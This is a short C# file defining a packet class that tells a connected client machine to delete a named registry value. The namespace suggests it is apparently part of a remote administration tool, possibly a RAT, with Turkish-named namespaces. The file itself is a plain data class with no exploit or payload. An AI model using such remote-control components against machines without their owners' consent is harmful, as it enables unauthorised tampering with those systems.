using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.KuuhakuÇekirdek.Ağ;

namespace xClient.KuuhakuÇekirdek.Paketler.ServerPaketleri
{
    [Serializable]
    public class DoDeleteRegistryValue : IPacket
    {
        public string KeyPath { get; set; }
        public string ValueName { get; set; }

        public DoDeleteRegistryValue(string keyPath, string valueName)
        {
            KeyPath = keyPath;
            ValueName = valueName;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
